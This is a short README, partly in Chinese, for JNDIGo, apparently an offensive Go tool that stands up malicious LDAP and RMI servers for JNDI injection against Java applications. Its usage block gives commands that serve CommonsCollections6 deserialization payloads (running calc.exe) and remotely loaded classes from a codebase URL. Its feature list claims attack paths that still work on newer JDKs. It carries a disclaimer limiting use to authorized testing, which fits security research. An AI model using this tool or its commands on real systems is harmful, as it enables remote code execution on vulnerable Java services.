# JNDIGO

## Usage

example:
```
#ldap
./JNDIGo ldap -l
./JNDIGo ldap 127.0.0.1 6666 CommonsCollections6 calc.exe
./JNDIGo ldap 127.0.0.1 6666 factory com.example.remote http://localhost:8080/

#rmi
./JNDIGo rmi -l
./JNDIGo rmi 127.0.0.1 6666 CommonsCollections6 calc.exe
./JNDIGo rmi 127.0.0.1 6666 factory com.example.remote http://localhost:8080/
```

## Feature

- 支持两条在高版本jdk下仍然可用的的反序列化攻击路径 JRMP Listener/LDAP Deserialize
- 支持codebase远程加载类的payload LDAP jdk<8u191 / RMI jdk<7u21、6u45 或者远端开启对应的codebase权限
- 采用golang 从数据流层面解析，无需java环境，无需下载ysoserial.jar

## 感谢

4ra1n师傅的(gososerial)[https://github.com/4ra1n/Gososerial]

## 免责申明

未经授权许可使用JNDIGo攻击目标是非法的

本程序应仅用于授权的安全测试与研究目的